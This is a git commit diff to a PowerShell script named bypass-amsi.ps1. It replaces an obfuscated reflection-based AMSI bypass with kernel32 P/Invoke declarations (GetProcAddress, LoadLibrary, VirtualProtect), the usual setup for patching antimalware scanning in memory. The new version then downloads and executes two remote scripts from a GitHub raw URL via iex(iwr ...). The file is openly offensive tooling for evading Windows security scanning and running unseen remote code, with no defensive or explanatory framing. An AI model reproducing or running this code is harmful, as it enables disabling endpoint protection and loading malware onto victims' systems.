44b251d32fa413f1e8a82c36adfc7efd9b8c3526
robertoaguilarfields-blip <robertoaguilarfields@gmail.com>
2025-09-26 06:28:56 +0200

    bypass-amsi.ps1

--- bypass-amsi.ps1
+++ bypass-amsi.ps1
@@ -1,3 +1,24 @@
-$A="5492868772801748688168747280728187173688878280688776828"
-$B="1173680867656877679866880867644817687416876797271"
-[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " " ).GetField([string](38..51|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " ",'Non' + 'Public,Static').SetValue($null,$true)
+# main.ps1
+$Win32 = @"
+
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+}
+"@
+
+Add-Type $Win32
+
+iex ( iwr https://github.com/robertoaguilarfields-blip/my-proyecto/raw/refs/heads/main/1.txt -UseBasicParsing );
+iex ( iwr https://github.com/robertoaguilarfields-blip/my-proyecto/raw/refs/heads/main/2.txt -UseBasicParsing );
